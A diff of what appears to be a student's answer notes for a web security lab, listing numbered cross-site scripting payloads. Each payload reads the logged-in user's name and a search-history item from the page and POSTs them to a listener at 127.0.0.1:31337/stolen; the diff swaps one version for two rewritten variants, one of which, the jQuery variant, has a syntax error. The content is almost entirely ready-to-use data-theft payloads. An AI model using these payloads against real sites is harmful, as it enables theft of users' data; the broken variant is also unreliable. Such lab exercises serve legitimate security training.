@@ -54,7 +54,8 @@ document.cookie = "username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 UTC";
 <script>document.cookie='csrf_token=9f06e550e78ee7e297073fc935e72b1a'</script>
 9f06e550e78ee7e297073fc935e72b1a
 Number 1:
-<script>window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}</script>
+<script>var xhr = new XMLHttpRequest()</script><script>window.onload = function () {var send=`http://127.0.0.1:31337/stolen`+`user=`+String(document.getElementById(`logged-in-user`).innerHTML)+`&last_search=`+document.getElementsByClassName(`history-item list-group-item`).item(1)}</script><script>xhr.open(`POST`, send, true)</script><script>xhr.send()</script>
+<script>window.onload = function (){$.post (`http://127.0.0.1:31337/stolen`, {user: document.getElementById(`logged-in-user`).innerHTML lastsearch: document.getElementsByClassName(`history-item list-group-item`).item(1)})}</script>
 Number 2:
 <BODY ONLOAD="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
 Number 3:
